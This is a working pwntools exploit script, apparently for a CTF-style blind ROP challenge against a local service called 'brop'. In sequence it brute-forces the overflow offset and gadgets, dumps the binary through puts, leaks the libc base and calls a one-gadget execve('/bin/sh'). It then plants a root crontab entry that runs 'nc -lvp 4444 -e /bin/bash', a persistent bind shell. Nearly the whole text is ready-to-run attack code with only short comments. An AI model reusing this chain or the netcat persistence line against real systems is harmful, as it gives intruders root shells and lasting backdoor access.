from pwn import *
    
#context.log_level = 'debug'
l = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False) # libc information load
    
base = 0x400000

# find overflow point in binary
def find_overflow():
    for i in range(1, 0x1000):
        s = connect('localhost', 10001, level='error') # connect to server
        try:
	    # send 'a' repeatedly increasing 1 to find overflow point
            s.sendline('a'*i)
            data = s.recvuntil('game\n', timeout=1)
	    # if we got a EOFError, that's a overflow point, print and close the connection
        except EOFError:
            log.info('overflow length: {}'.format(i-1))
            s.close()
            return i-1
        s.close()
    
def find_stop(over_len):
    for i in range(0, 0x1000):
        if i%100 ==0:
            log.info('try.. {}'.format(i))
    
        s = connect('localhost', 10001, level='error') # connect to server
        try:
   	    # send a overflow data with return address overwrite
	    # at this point, return address are increasing repeatedly same above based 0x400000
            s.sendline(b'a'*over_len+p64(base+i))
            data = s.recvuntil(b'password?\n')
            data = s.recvuntil(b'password?\n')
            log.info('data: {}'.format(data))
	    # if we got a 'password' in stdout, that means come back to the main
            if b"password" in data:
                log.info('stop gadget: {}'.format(hex(base+i)))
                s.close()
                return base+i
        # if we got a EOFError, that means connection is close without back to the main
        except EOFError:
            s.close()
def find_maybe_brop(over_len, stop_gadget):
    for i in range(0, 0x1000):
        if i%0x100 == 0:
            log.info('try.. {}'.format(hex(i)))
        s = connect('localhost', 10001, level='error') # connect to server
        
        try:
	    # find pop*6 ret gadget
	    # with six 64bit data and stop gadget, if base+i is pop*6, the binary come back to the main
            pay = b'a'*over_len
            pay += p64(base+i)
            pay += p64(0)*6
            pay += p64(stop_gadget)
            data = s.recvuntil(b'password?\n')
            s.sendline(pay)
            data = s.recvuntil(b'password?\n', timeout=0.2)
            # if binary come to the main, base+i is two cases
	    # one is pop*6; imul; call ~~
            # two is pop*6; ret := libc_csu_init gadget
	    # we want to base+i is two
            if b'password' in data:
                log.info('maybe brop gadget: {}'.format(hex(base+i)))
                s.close()
                gadget = find_brop(over_len, base+i)
                if gadget:
                    gadget += 9
                    log.info('rdi gadget: {}'.format(hex(gadget)))
                    return gadget
        except EOFError:
            s.close()
def find_brop(over_len, addr):
    try:
	# when code without stop gadget, if binary got a EOFError, base+i is pop*?;ret gadget
        s = connect('localhost', 10001, level='error') # connect to server
        pay = b'a'*over_len
        pay += p64(addr)
        pay += p64(0x41)*10
        s.sendline(pay)
        data = s.recvuntil(b'password?\n')
        data = s.recvuntil(b'password?\n')
        if b'password' in data:
            s.close()
            return 0
    except EOFError:
        log.info('find brop gadget: {}'.format(hex(addr)))
        s.close()
        return addr
def find_puts(over_len, pop_rdi):
    for i in range(0, 0x1000):
        if i%0x100 == 0:
            log.info('try.. {}'.format(hex(i)))
        try:
	    # find puts_plt
            s = connect('localhost', 10001, level='error') # connect to server
            pay = b'a'*over_len
            pay += p64(pop_rdi)
            pay += p64(0x400000)
            pay += p64(base+i)
            s.sendline(pay)
            data = s.recvuntil(b'\x7fELF')
	    # if we got a \x7fELF (ELF Format Magic Byte), base+i is a puts_plt
	    # and this means we are able to leak binary in the server !
            if b'\x7fELF' in data:
                log.info('puts%plt: {}'.format(hex(base+i)))
                s.close()
                return base+i
	# if nothing print in the stdout, fails
        except EOFError:
            s.close()

def memory_dump(size,stop_gadget,rdi_ret,puts_plt):
    now = base
    end = 0x401000
    dump = b""
    while now < end:
        if now % 0x100 == 0:
            log.info("Progressed to  0x%x" % now)
	# dump binary using puts_plt from the 0x400000
        r = connect('localhost', 10001, level='error') # connect to server
        payload = b''
        payload += b'A' * size
        payload += p64(rdi_ret)
        payload += p64(now)
        payload += p64(puts_plt)
        payload += p64(stop_gadget)
        r.recvuntil(b'WelCome my friend,Do you know password?\n')
        r.send(payload)
        try:
            data = r.recv(timeout=0.5)
            r.close()
            data = data[:data.index(b"\nWelCome")]
        except ValueError as e:
            data = data.rstrip(b'\n')
        except Exception as e:
            continue
        if len(data.split()) == 0:
            data = b'\x00'
        dump += data
        now += len(data)
#    with open('memory.dump','wb') as f:
#        f.write(dump)

def find_libc(s, over_len, stop_gadget, pop_rdi, puts_plt, puts_got):
    # find server libc address using puts_plt
    s.recvuntil(b'password?\n')
    pay = b'a'*over_len
    pay += p64(pop_rdi)
    pay += p64(0x601018)
    pay += p64(puts_plt)
    pay += p64(stop_gadget)
    s.sendline(pay)
    l_base = u64(s.recv(6).ljust(8, b'\x00'))-l.symbols['puts']
    log.info('l_base: {}'.format(hex(l_base)))
    return l_base

'''
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''
def ex(s, over_len, stop_gadget, pop_rdi, l_base):
    # finally exploit
    s.recvuntil(b'password?\n')

    system = l_base + l.symbols['system']
    binsh = l_base + 0x1b75aa
    
    one_list = [0xe6c7e, 0xe6c81, 0xe6c84]
    one = l_base + one_list[1]
    print(hex(one))

    csu_pop = 0x4007ba
    csu_call = 0x4007a0

    pay = b'a'*over_len
    pay += p64(csu_pop)
    pay += p64(0)*2
    pay += p64(0x7fffffffdfb0)
    pay += p64(0)
    pay += p64(one)
    pay += p64(0)
    pay += p64(csu_call)

    s.sendline(pay)
    s.sendline('echo "* * * * * root nc -lvp 4444 -e /bin/bash" >> /etc/crontab')
    s.interactive()

over_len = 72
stop_gadget = 0x4005c0
pop_rdi = 0x4007c3
puts_plt = 0x400555
puts_got = 0x601018

#memory_dump(over_len, stop_gadget, pop_rdi, puts_plt)
#over_len = find_overflow()
#stop_gadget = find_stop(over_len)
#pop_rdi = find_maybe_brop(over_len, stop_gadget)
#puts_plt = find_puts(over_len, pop_rdi)

s = connect('localhost', 10001, level='error') # connect to server
s = process('./brop')
l_base = find_libc(s, 72, stop_gadget, pop_rdi, puts_plt, puts_got)
ex(s, over_len, stop_gadget, pop_rdi, l_base)
